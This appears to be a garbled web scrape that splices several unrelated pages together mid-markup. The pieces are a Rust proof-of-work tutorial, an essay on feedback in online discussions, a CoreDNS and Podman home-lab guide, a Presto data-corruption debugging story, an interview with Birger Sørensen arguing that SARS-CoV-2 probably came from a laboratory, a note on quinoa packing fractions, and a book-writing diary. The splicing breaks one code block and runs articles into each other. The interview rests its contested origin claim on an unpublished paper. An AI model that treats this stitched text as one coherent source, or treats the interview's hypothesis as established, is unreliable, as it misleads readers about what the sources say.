                <p>To provide the correct proof of work for a block:</p>
                <ol>
                    <li>Serialise the block</li>
                    <li>Append a number</li>
                    <li>Hash it</li>
                    <li>Increment the number</li>
                    <li>Go back to 1</li>
                </ol>

                <p>The PoW is suffice if the hash begins with a certain number of 0s. The number of 0s required is called <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty</a>. The more difficulty - the more 0s are required. </p>

                <p>In reality, the difficulty is defined on a more granular level. See <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty on the bitcoin wiki</a> for more information.</p>

                <pre><code>
let mut nonce: u32 = 0;
let block_string = self.serialize();

loop {
    let block = format!("{}{}", block_string, nonce);
    let block_hash = hex::encode(crypto::sha256(block.clone()));
    if block_hash.starts_with(&amp;"0".repeat(difficulty)) {
        return Block {
            hash: block_hash,
            nonce,
            transactions: self.transactions
        }
    }
    nonce += 1;
}
                </code></pre>

                <p>You should hopefully now see how this all fits together. To recap the high level code <a href="#code-main">initially presented</a>:</p>

                <ol>
                    <li>Generate keypairs for each user</li>
                    <li>Using the private key of the user, sign transactions that move bitcoin</li>
                    <li>Combine these transactions in a "block"</li>
                    <li>Perform the PoW on this block until the difficulty condition is met</li>
                </ol>

                <p>Finally running this program will produce a block including the signed transactions. Take note of the hash. It begins with "000", therefore it is a valid block when difficulty is set to 3.</p>

                <pre><code>
Mining block with 2 txs.

July 3, 2020 | https://devonzuegel.com/post/the-silence-is-deafening | <a href="https://web.archive.org/web/*/https://devonzuegel.com/post/the-silence-is-deafening">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type-cleanup="true">
                  <p>Imagine you're at a dinner party, and you're getting into a heated argument. As you start yelling, the other people quickly hush their voices and start glaring at you. None of the onlookers have to take further action—it's clear from their facial expressions that you're being a jerk.</p>

<p>In digital conversations, giving feedback requires more conscious effort. Silence is the default. Participants only get feedback from people who join the fray. They receive no signal about how the silent onlookers perceive their dialogue. In fact, they don't receive much signal that onlookers observed the conversation at all.<span><sup id="footnote-label--1">1</sup></span></p>

<p><span>As a result, the feedback you do receive in digital conversations is more polarized, because the only people who will engage are those who are willing to take that extra step and bear that cost of wading into a messy conversation. </span></p>

<p>When Angry Alice tweets something obnoxious or unproductive, reasonable people just scroll past it. If Alice develops a pattern of bad behavior, reasonable people will just unfollow, mute, or block her. The result is that it's hard for Alice to notice the silent majority of people who saw the trash fire and walked away when they recognized that engaging would only fuel its flames.</p>

<p>It gets worse—Angry Alice only sees feedback from extremists, so she doesn't receive more nuanced signals that might actually cause her to reflect on her behavior. <span>If no reasonable people give feedback, only the unreasonable people are left. </span>From Alice's perspective, the only people who disagree with her are jerks.</p>

<p>This is a coordination problem. Reasonable people understand that if they join the fray alone, they'll most likely be drowned out by the yelling, or worse they'll get dragged deeper into it. As a result, they choose stay out of it. </p>

<p>A huge part of the problem is that digital spaces generally have no equivalent of a disapproving glare. You're stuck choosing between staying silent and entering the fray, with few options in between. If you have little reason to believe that other reasonable people will back you up, you're going to stick with the default: silence.</p>

<p>This is a hard problem to solve, but it's not impossible. <span>You</span> can break the coordination trap! <span><sup id="footnote-label--2">2</sup></span></p>

<p>For example, I often send friendly DMs to combatants to share my perspective on how they could make combative Twitter threads more productive.</p>

<p>This works far better than you'd expect! In the last few years, I've DMed at least a dozen people who were being unreasonable or mean on Twitter. In all cases but one, it resulted in a constructive conversation between me and that person. In most cases, that in turn led to a retraction of their original tweet, a clarification of their position, or a marked improvement in subsequent discourse.</p>

<p>Four things I've found that make this approach more likely to succeed:</p><ol><li><p>You must show the person that you're not trying to attack them but to make them <span>more effective</span>. You're giving them feedback on process, not a moral lecture.</p></li><li><p>Bringing it into a private space<span><sup id="footnote-label--3">3</sup></span> like DMs is crucial, because it credibly shows that you're not trying to get brownie points from your in-group by bashing them in public.</p></li><li><p>This works better if the conversation at hand is in a thread you yourself started. It's a bit like giving feedback to someone at a party you're hosting—they're more likely to respect your boundaries in a social space you created. This is not a requirement, but it helps.</p></li><li><p>Make sure you're not dealing with a grifter. A grifter is someone who benefits from perpetuating the problem and has no actual desire to solve it (despite their rhetoric that may say otherwise). If they're a grifter, all the above advice is useless. Get away from the trash fire as fast as you can.</p></li></ol>
<p>I should note, this is a lot of work. There's a reason I've only done it about a dozen times over the last few years, even though there have been far, far more opportunities to do so. </p>

<p>But if everyone tried this method just a few times a year, then we just might break through this silence and raise the quality of our digital discourse.</p>

<p><span><p><span></span><span><span>1</span></span><span></span> The technical term for these silent onlookers is "lurkers".</p></span></p><p><span><p><span></span><span>2</span><span></span> Although this post is focused on how you as an individual can make a difference one conversation at a time, I'm even more excited about the structural opportunity that platforms have to enable users to express disapproval more subtly. <span>One idea I'd really like to see platforms like Twitter or Reddit try is to provide a mechanism for low-friction, private, negative feedback. For example, you could imagine offering a button where you can downvote or thumbs-down content (i.e. the opposite of a Like), but the count is only visible to the OP and not to anyone else. </span><span>EDIT 7/4/2020:</span><span> My friend Zooko </span><a href="https://twitter.com/zooko/status/1279492581655588864">evolved</a><span> this idea slightly, and I dig the suggestion: "</span><span>Imagine a "ಠ_ಠ" button on each tweet. The poster finds out how many people *THAT THEY FOLLOW* clicked that button, but can't find out specifically who. They just know that the crowd of people *that they respect* has a certain air of disapproval."</span><span></span></p></span></p><p><span><p><span></span><span>3</span><span></span> Of course the downside of this approach is that you don't get the opportunity to spread these norms to onlookers of the conversation. This is not always the right tradeoff! Public feedback can help onlookers understand reasons why they should not admire that behavior. But doing it privately makes it much more likely that that particular person will actually change their behavior, which is what I'm optimizing for in these cases.</p></span><span andale="" mono";"="">

</code></pre> <p>The network will look like this.</p> <p>CT-HOST is a Fedora32 laptop running Podman and will manage container lifecycles. The host resides on two networks: LAN (192.168.185.0/24) where devices communicate and CONTAINER-LAN (10.89.0.0/24) where containers communicate. The CONTAINER-LAN is virtual and created by the linux kernel.</p> <p>Containers may be exposed on "ct-host" to devices on LAN by port-forwarding the container's port onto the hosts. Not every container needs to have their ports forwarded but to achieve name resolution this is required.</p> <h2>Name Resolution</h2> <p>Name resolution provides mapping from a hostname to a service. This is encountered every time "www.google.com" is typed into a browser. The name "www.google.com" is resolved to an IP address where web servers provide this service. This lab creates the <code>ldelossa.net</code> local domain.</p> <p>Personally, I don't want to write RFC 1035 zone files, host ancient bind servers, or deal with cryptic configs. There is a certain beauty in the syntax of a hosts file. A simple text file which maps a hostname to an IP address suits my needs well. The answer was found in <a href="https://coredns.io/">CoreDNS</a> and its <a href="https://coredns.io/plugins/hosts/">hosts</a> plugin.</p> <p>On top of a terse syntax the "hosts" plugin provides dynamic reloading. Changes to the file holding your hostname mappings will reload the server, the changes taking effect soon after.</p> <h3>Podman</h3> <p>Podman is the container runtime used in this lab.</p> <p>Podman and Systemd play along nicely. Systemd services can be generated directly from Podman. These service files can be used to start the container on boot, restart it on failure, create dependencies between containers, or other facilities Systemd offers.</p> <h3>CoreDNS Container</h3> <p>configuration:</p> <pre><code><span>$</span><span> cat Corefile</span>
.:53 {
  cache 10
  forward . 8.8.8.8 9.9.9.9
  log
  errors
}

ldelossa.net {
  cache 10
  hosts /etc/coredns/hosts {
  }
}
<span>$</span><span> cat hosts</span>
192.168.185.10 traefik.ldelossa.net
192.168.185.10 ct-host.ldelossa.net
192.168.185.10 prom.ldelossa.net
</code></pre> <p>CoreDNS with the host plugin uses two configuration files: "Corefile" and "hosts" file.</p> <p>The "Corefile" configures Coredns to forward requests not destined for <code>ldelossa.net</code> to Google's DNS and cache the results for a bit. Any requests for <code>ldelossa.net</code> are forwarded to the "hosts" plugin, using the file <code>/etc/coredns/hosts</code>.</p> <p>The "hosts" defines hostname mappings. For each entry in this file Coredns will return an A record mapping the hostname to the IP address.</p> <pre><code><span>$</span><span> podman create --network ct-host --name coredns -dt -p 192.168.185.10:53:53/tcp -p 192.168.185.10:53:53/udp -v /etc/containers/etc.d/coredns:/etc/coredns coredns/coredns -conf /etc/coredns/Corefile</span>
</code></pre> <p>Above shows the podman command used to create the container.</p> <p>A few things to note</p> <ul> <li>Port 53(udp/tcp) is exposed to other devices on LAN via port-forwarding</li> <li>Configuration files are mapped from <code>/etc/containers/etc.d/coredns</code> to <code>/etc/coredns</code> inside the container.</li> <li>Editing the "hosts" file on "ct-host" will reload Coredns without having to restart the container.</li> </ul> <pre><code><span>$</span><span> podman generate systemd --name coredns &gt; /etc/systemd/system/coredns-container.service</span>
<span>$</span><span> systemctl daemon-reload</span>
<span>$</span><span> systemctl <span>enable</span> coredns-container</span>
<span>$</span><span> systemctl start coredns-container</span>
</code></pre> <p>A SystemD service can be generated and enabled with the commands above.</p> <h3>Configuring Devices</h3> <p>A typical approach to configuring devices to utilize a custom DNS server would be DHCP. Unfortunately my router does not allow the configuration of DHCP (poo-poo to you ampliFi). However, devices can "opt-in" by setting their DNS server to <code>192.168.185.10:53</code>.</p> <p>As new services come onto the network simply editing <code>/etc/containers/etc.d/coredns/hosts</code> on "ct-host" will provide immediate resolution for devices configured with this DNS.</p> <h2>Conclusion</h2> <p>Home labs are a great way to learn new technologies. By utilizing Podman and CoreDNS a solution for name resolution was devised. Mapping configuration files from the host into containers provides a fast and dynamic way to update DNS in the lab.</p> <p>In <a href="https://www.ldelossa.is/blog/home-network-pt2">Part 2</a> a mechanism for routing hostnames to specific containerized services is introduced.</p> </article></div></div></div>]]>

  <div itemprop="articleBody">
    <p>It all started on an Thursday afternoon in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks, as we were ramping up to Starburst Enterprise
Presto 332-e release. Karol discovered what seemed to be a serious regression, and turned out to be even more
serious Cloud environment issue.</p>

<!--more-->



<p>At the Presto project, we take serious care of stability and efficiency, so releases undergo
rigorous performance benchmarks. The intention is to safe guard against any performance regressions
or stability problems. Usually, the performance improvements are benchmarked separately when they
are being added to the codebase. At Starburst, those benchmarks are even more important, especially
for the Starburst Enterprise Presto LTS releases.</p>

<p>On a side note, we use <a href="https://github.com/prestosql/benchto/">Benchto</a> for organizing
<a href="https://github.com/prestosql/presto/tree/master/presto-benchto-benchmarks">Presto benchmark suites</a>,
executing them and collecting the results. We use managed <a href="https://kubernetes.io/">Kubernetes</a> in a public
cloud for provisioning Presto clusters, along with <a href="https://www.starburstdata.com/presto-on-kubernetes/">Starburst Enterprise Presto Kubernetes</a>.
We use <a href="https://jupyter.org/">Jupyter</a> for producing result reports in HTML and PDF formats.</p>



<p>It all started in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks for the Starburst Enterprise Presto 332-e release.
On one Thursday afternoon he reported stability problems, with few benchmark runs failing with
exceptions similar to:</p>

<div><div><pre><code>Query failed (#20200326_150852_00338_dj225): Unknown block encoding:
LONG_ARRAY� � �� � @@@���� �@  @ � �@@@ @@� @�@D�� @@��@ `� @@� @#�@ � 0�
... (9550 more bytes)
</code></pre></div></div>

<p>In Presto, a block encoding is a way of encoding a particular Block type (here, a <code>LongArrayBlock</code>).
They are used when exchanging blocks of data between Presto nodes, or in spill to disk.
Blocks form a polymorphic class hierarchy, so every time a block is encoded, we need
to also store the encoding identifier. The encoding identifier (here, the <code>LONG_ARRAY</code> string)
is written as <code>&lt;string length&gt;</code> (4-byte, signed integer in little-endian) followed by
<code>&lt;string bytes&gt;</code> containing the UTF-8 representation of the encoding id. Clearly, in the case above,
the receiver read the <code>&lt;encoding id length&gt;</code> as 9623 instead of 10! How could that be ever possible?</p>

<p>Presto 332 brought a lot of good changes and upgrade to Java 11 was one of them.
Therefore, Starburst Enterprise Presto 332-e was the first Starburst release using Java 11 by default.
For earlier releases, we ran benchmarks using AWS EC2 machines orchestrated with <a href="https://www.starburstdata.com/presto-aws-cloud/">Starburst’s Presto
CloudFormation Template (CFT)</a>. This was also the first time we did
Presto release benchmarks running on Kubernetes clusters, with AWS EKS. We could suspect many different factors
as being the cause. We started to sift through the code, search team’s “collective brain” and
the Internet for any ideas. One of the important sources was Vijay Pandurangan’s writeup on <a href="https://tech.vijayp.ca/linux-kernel-bug-delivers-corrupt-tcp-ip-data-to-mesos-kubernetes-docker-containers-4986f88f7a19">data
corruption bug discovered by Twitter in 2015</a>. Of course, we also repeated benchmark runs. Seeing is believing.</p>



<p>On the next day, a customer reported similar problems with their Presto cluster. Of course, they
were not running a yet-to-be-released version that we were still benchmarking. They run into what seemed to
be a very serious regression in a Starburst Enterprise Presto 323-e release line. The customer was also using
the AWS cloud, but not the Kubernetes deployment. They were using <a href="https://www.starburstdata.com/presto-aws-cloud/">CFT-based deployment</a>
– the same stack we were using for all our release benchmarks so far – and we had never run into issues like this before.
As the customer was using a fresh-off-press latest minor release, we decided (in spirit of global health care trend)
to “quarantine” that release and roll back the customer installation to the previous version.</p>

<p>However, the fact that a small bug fix release triggered data problems was unnerving. The fact that we
did not discover any of these problems before, was even more unnerving.</p>



<p>As we were running more and more, and even more test runs, we discovered new failure modes.
For example:</p>
<div><div><pre><code>Query failed (#20200327_001931_00020_8di4r): Cannot cast DECIMAL(7, 2) '18734974449861284.67' to DECIMAL(12, 2)
</code></pre></div></div>
<p>Well, this message is not <em>wrong</em>. It’s not possible to cast <code>18734974449861284.67</code> to <code>DECIMAL(12, 2)</code>.
Except that it is <em>also</em> not possible to have a <code>DECIMAL(7, 2)</code> with such value. Something wrong happened to the
data. At that moment, we realized the problem was very serious, because data could become corrupted.
This corrupted data could lead to a failure (like above), but it could also lead to incorrect query results,
or incorrect data being persisted (in case of <code>INSERT</code> or <code>CREATE TABLE AS</code> queries). We created
a virtual War Room (that is, a Slack channel), got together all Presto experts and our experienced field team
to discuss potential causes, further diagnostics and mitigation strategies.</p>

<p>Since the problem was affecting data exchanges between Presto nodes, we listed the following strategies
to try to dissect the problem:</p>

<ul>
  <li>determining which query (queries) is (are) causing failures,</li>
  <li>running with HTTP/2,</li>
  <li>reverting to running on Java 8,</li>
  <li>enabling exchange compression (as decompression is very sensitive to data corruption),</li>
  <li>trying to upgrade Jetty,</li>
  <li>determining whether failures correlate with JVM GC activity,</li>
  <li>inspecting the source code.</li>
</ul>



<p>We were able to quickly prototype and verify some of the ideas. Switching to HTTP/2 or
upgrading Jetty to the latest version did not help. Nor did downgrading to Jetty version
that had been using for a long time. We also verified that problem was reproducible with Java 8,
so we concluded Java 11 was not the cause of it.</p>



<p>We identified the problem occurs somewhere within exchanges, between one Presto worker
node serializing a <code>Page</code> object (basic unit of data processing in Presto) and another node
deserializing it.</p>

<p>While decimal cast failure didn’t directly point at the data corruption problem (there could
be many other reasons for it), there was no other explanation for the <code>Unknown block encoding</code> exceptions.
The serialization is done in <code>PagesSerde.serialize</code> (used by <code>TaskOutputOperator</code>, the data sender) and
deserialization is done in <code>PagesSerde.deserialize</code> (used by <code>ExchangeOperator</code>, the
receiver of the data). As the logic is nicely encapsulated in <code>PagesSerde</code> class, we
added checksums to the serialized data: <code>&lt;checksum&gt; &lt;serialized page&gt;</code>.
This felt like a smart move – except that it gave us nothing more than a confirmation that
there is a problem (“checksum failure”).
This we already knew.</p>

<p>We considered adding logging to capture data going out from one node and going in on
another node, but that would be huge amount of logs. One run of benchmarks transfers
hundreds of terabytes of data between the nodes.</p>

<p>We went ahead and created a Presto build that added data redundancy to be able to reconstruct
the data on the receiving side.
There are many <a href="https://en.wikipedia.org/wiki/Erasure_code">well-known error-correction codes</a>
(e.g. <a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction">Reed–Solomon error correction</a>
available in Hadoop 3). In our case, speed of <em>implementation</em> (a.k.a. simplicity) was a deciding factor,
so we added data mirroring: <code>&lt;checksum&gt; &lt;serialized page&gt; &lt;serialized page&gt;</code>.
In order to avoid logging of all the data exchanges, we added the deserialized pages (both copies)
to the exceptions being raised.</p>

<p>The exception told us the first part was changed, since read checksum did not match the calculated
checksum (it was calculated based on the first copy of the data and was different than the checksum
calculated on the sending side).
Having the encoded data in the exception like that, it was easy to extract the actual data and compare,
so now we could see <em>how</em> the data was changed.</p>

            <h2>NYHET</h2>



        

        

            <h3 itemprop="description">
            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

         <img src="https://www.efavdb.com/images/quinoa.jpg">
</p>

<p>I was struck the other day by the following:  The cooking instructions on my
Bob’s tri-colored quinoa package said to combine 2 cups of water with 1 cup of
dried quinoa, which would ultimately create 4 cups of cooked quinoa.  See image&nbsp;above.</p>
<p>My first reaction was to believe that some error had been made.  However, I
then realized that the explanation was packing:  When one packs spheres or
other awkward solid geometric shapes into a container, they cannot fill the
space completely.  Little pockets of air sit between the spheres.  A quick
google search for the packing fraction of spheres gives a value of <span>\(0.75\)</span> for a
crystalline structure and about <span>\(0.64\)</span> for random packings — apparently a
universal&nbsp;law.</p>
<p>We can get a similar number out from my quinoa instructions: Suppose that
before the quinoa is cooked, the water fills its volume completely.  However,
after cooking, the water is absorbed into the quinoa and forced to share its
packing fraction.  The quinoa stays at the same packing fraction before and
after cooking, so the water must be responsible for the volume growth.  This
implies it went from 2 cups to 3,&nbsp;or
</p>
<p>\begin{eqnarray} \tag{1} \label{1}
2 = \rho \times 3,
\end{eqnarray}</p>
<p>
where <span>\(\rho\)</span> is the packing fraction of the quinoa “spheres”. We conclude that
the packing fraction is <span>\(\rho = 2/3\)</span>, very close to the googled value of <span>\(\rho
= 0.64\)</span>.</p>

It’s twenty years of work experience, numerous failures, a handful of successes and a personal desire to continously grow and expand my knowledge.</p> <p>For the past few years, I repeatedly thought I would like to write a book about everything it takes to run a web application in production. There are tutorials, video courses and guides available online for any topic you can imagine. Need to compare React and Svelte? You’ll find <a href="https://www.mikenikles.com/blog/why-i-moved-from-react-to-svelte-and-why-others-will-follow">plenty of tutorials</a>. Want to learn SRE (site reliability engineering) best practices? <a href="https://landing.google.com/sre/books/" rel="nofollow">Check here</a>.</p> <p>However, unless you know what to look for, you won’t succeed because there are so many pieces to the puzzle, it’s challenging to know where to start.</p> <h3>February 2020</h3> <p>With COVID-19 spreading across the globe and governments putting countries into lockdown, it became immediately apparent that this is not like a previous pandemic. I had two options:</p> <ul><li>worry, feel anxious, be unsure what to do</li> <li>look at it as an opportunity</li></ul> <p>I was privileged enough not to worry, not to feel anxious. So I went for the second option and decided to make the best of the situation.</p> <p>It was now or never to write a book. Luckily, my wife supported me all the way, otherwise this would have never been possible. In fact, she encouraged me to spend as much of my spare time on the book because she knew how much it would mean to me to publish that book I had been talking about for years.</p> <p>The outline of the book had been in my mind for a while already. The tech stack I wanted to use was pretty clear to me as well. I wanted to use technologies that I believe in, technologies I use in my projects and technologies I believe are about to become very popular.</p> <p><strong>Self-publish vs. using a publisher</strong></p> <p>This is a tricky one. Late in 2019, I was contacted by two publishers who asked me to develop a <a href="https://svelte.dev/" rel="nofollow">Svelte</a> online course. When I learned that my take-home pay would be between 12% and 18%, I declined. Now, writing a book was never about earning a lot or quitting my day job. It was about sharing my knowledge and helping others learn from my experience. Having said that and knowing my personality, I knew I would make this as perfect as it gets and invest a lot of time. So why did I reject the publishers? Quite simple, while the financial reward is not the first priority, I believe my knowledge and two decades of experience is worth something worth paying for. It’s still a lot cheaper than four years at university where you are taught things you likely won’t need in real life.</p> <p>In addition, a publisher provides you with technical reviews. Without sounding arrogant, my book is about my experience, my view of what’s best and my best practices. There are very few people who know my experience better than myself. It turned out I had amazing technical reviwers among my co-workers and friends, and even a PhD student from Austria who, by chance, found my website and contacted me. He became the first to fully review line by line and provided input as valuable as a tech reviewer at a publishing company could have done.</p> <p>A publisher would have given me a wider reach, but on the other hand, my blog gets 80 to 100 unique visitors per day from across the world, that’s good enough for me to get started.</p> <h3>March, April and May 2020</h3> <p>From a “behind the scenes” point of view, these months were not exciting. Lots of writing, both the book and the corresponding source code.</p> <p>I started with an empty Google Doc, wrote down the top-level chapters and started with the “About the author” chapter. It was the only chapter I was pretty sure I knew what to write :-). It also helped to turn the white screen into something that looked like a tiny essay. Anything other than a blank page is better at that stage of the process!</p> <p><strong>Development of the source code</strong></p> <p>The idea was to give access to the source code to all readers. I wanted to make sure the commit history, the PRs and everything related to the code was perfect. So how did I manage 105 commits without any mistakes or commit messages such as “Whoops… try again.”?</p> <p>I had two repositories! A “playground” where I experimented, made sure everything worked and tested things for individual chapters. In parallel to the experimentation, I wrote the book’s hands-on part. When I was satisfied with the code, I switched to the “clean” repository, the one readers have access to now. I followed the instructions I wrote in the book. This made sure I was the first person to actually follow along my instructions in the book. It also meant I wrote the entire book’s source code twice - once with lots of experimentation and once in a clean way. As I’m writing this, I was curious to see how many commits the “playground” repo has and to my surprise… it has 119! That’s only 14 more than the final repo… I could have sworn it would be a lot messier!</p> <p><strong>June 2020</strong></p> <p>The book’s content was completely written some time in early June. At that point, I shared the book with a few more technical reviewers. Prior to that, I had a few close friends and “Thomas, the Austrian” who provided feedback. The tech reviews went very well and I felt comfortable publishing the book.</p> <p><strong>June 26, 2020</strong></p> <p>Two days before the self-imposed publication deadline, my wife suggested we develop a landing page for the book. “Sure!” She also did some research on book covers and designed the one you see now. Based on that, we developed the website in the same colors.</p> <p><strong>June 27, 2020</strong></p> <p>I adjusted headings, aligned them to new pages and updated the table of contents. My wife reviewed it and made sure everything was properly aligned. My wife got up, looked at me and said, “We need to change the icons in the book.” One day to go… I was surely nervous, but learned over the years that it’s best to trust her. I’m glad I did as the icons now look a million times better than the black &amp; white ones I used previously!</p> <p>June 27 was a Saturday and we stayed up until 2:30am or so on Sunday morning. When we finally went to bed, we felt we were ready.</p> <p><strong>June 28, 2020</strong></p> <p>A few last-minute updates to the table of contents due to changes to page numbers and I downloaded the PDF and published it on <a href="https://gum.co/cloud-native-web-development" rel="nofollow">Gumroad</a>.</p> <h2>Lessons I learned up to this point</h2> <p><strong>Pros</strong></p> <p>I think the best thing I did was starting with a very clear idea in my mind of what I want to write about. I knew exactly who the target audience would be, I pretty much had all chapters in mind and also knew I wanted there to be source code and a private community of everyone who buys the book.</p> <p>Patience &amp; dedication: From the very beginning, I set myself a strict deadline of June 28, 2020 (my birthday). This project was a big time investment and I knew there is no excuse to delay anything if I wanted to hit that deadline. The rule I set myself was very clear: Spend as much of my spare time on writing, every day. Looking back at my time tracking, I wrote at least a little bit every single day.</p> <p><strong>Cons</strong></p> <p>Writing a 200+ book, with 19 pull requests is a lot of work and I spent a few hundred hours on it. If I write another book, I will give myself more time. It is more likely though that I would write a shorter book ;-).</p> <p>Perfectionism is your biggest enemy to get stuff done. Sure, I’m very proud of the final outcome and how each chapter maps to a pull request and sometimes even individual sub-chapters that map to commit messages. My readers absolutely love and appreciate this, but it put a lot of pressure on me throughout the process.</p> <h2>The first week since publication</h2> <p><picture><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.webp" type="image/webp"><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jp2" type="image/jp2"><img alt="Gumroad sales in week 1" 